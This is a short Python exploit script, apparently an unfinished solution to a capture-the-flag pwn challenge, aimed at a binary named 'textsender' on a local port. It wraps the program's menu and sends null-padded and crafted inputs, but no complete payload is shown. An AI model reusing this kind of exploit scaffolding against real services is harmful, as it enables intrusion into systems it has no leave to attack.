#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./textsender")
host = args.HOST or "127.0.0.1"
port = int(args.PORT or 13334)

gdbscript = """
tbreak main
b *input
continue
""".format(
    **locals()
)


def choice(cmd):
    sla(b"> ", str(cmd).encode("latin-1"))


def set_sender(sname):
    choice(1)
    sla(b"Sender's name: ", sname)


def add_msg(rname, msg):
    choice(2)
    sla(b"Receiver: ", rname)
    sla(b"Message: ", msg)


def edit(rname, msg):
    choice(3)
    sla(b"New message: ", msg)


def print_notes():
    choice(4)


def send_all():
    choice(5)


libc = SetupLibcELF()
io = start()
j = b"\x00AAAAPPPP"
add_msg(b"\x00" * 120, j)
set_sender(j)


io.interactive()
